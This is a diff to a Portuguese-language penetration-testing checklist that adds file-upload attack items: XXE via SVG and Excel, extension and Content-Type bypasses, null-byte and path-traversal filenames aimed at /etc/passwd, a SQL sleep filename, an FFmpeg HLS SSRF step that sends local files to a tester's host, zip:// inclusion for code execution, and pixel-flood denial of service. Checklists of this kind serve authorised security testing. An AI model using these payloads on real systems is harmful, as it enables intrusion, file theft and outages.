@@ -692,6 +692,26 @@ Se você encontrar que WebDav está habilitado mas você não tem as permissões
 * [ ] Teste o upload de arquivos maliciosos colocando seu endereço IP no nome do arquivo
 * [ ] Teste o upload de arquivos maliciosos por nome de arquivo codificado
 * [ ] Teste o upload de arquivo malicioso por payload XSS, RCE, LFI, SQL ou outros no nome do arquivo
+* [ ] ImageTragick
+* [ ] XXE via arquivo svg
+* [ ] XXE via arquivo Excel
+* [ ] SVG para XSS
+* [ ] Passar pelas extensões enquanto faz upload(.jpg to .php, php3, php4, etc)
+* [ ] Validação Content-type
+  *   [ ] Faça Upload file.php e trocar o Content-Type: application/x-php to Content-Type:
+
+      image/png
+* [ ] Usando Byte Nulo: Upload img.phpD.jpg agora troque o valor de D (44) em Hex para 00
+* [ ] LFI: coloque o nome do arquivo ../..Jetc/passwd/logo.png para conseguir um diretório traversal via upload de arquivo
+* [ ] SQL: 'sleep(10).jpg
+* [ ] SSRF (e divulgação de arquivos locais) via FFmpeg HLS processamento
+  * [ ] Upload no ssrf.avi (ssrf via video.avi) e ouça na porta 1337 na sua VPS se você conseguir resposta em seguida, explore-o ainda mais para LFI
+  * [ ] Exploração: Modifique o file.avi e troque o path para http://ip:8080/initial.m3u? filename=/etc/passwd execute a exploração: python3 file Reading server.py --external-addr ip --port 8080
+* [ ] Upload file.js & file.config (web.config)
+* [ ] Ataque de inundação de pixels usando imagem
+* [ ] DoS usando valores grandes como o nome da imagem 1234567891011..99999.png
+* [ ] XSS payload em um nome de uma imagem payload.jpg
+* [ ] (Zip Slip) Se o site aceitar arquivos .zip, faça upload .php e compresse-o em .zip e depois faça upload. Agora visite, site.com/path page=zip://path/file.zip%23rce.php
 * [ ] Teste o upload de arquivos maliciosos enviando arquivos grandes (leva ao DOS)
 * [ ] Identifique a superfície de ataque lógico
 * [ ] Teste a transmissão de dados através do cliente
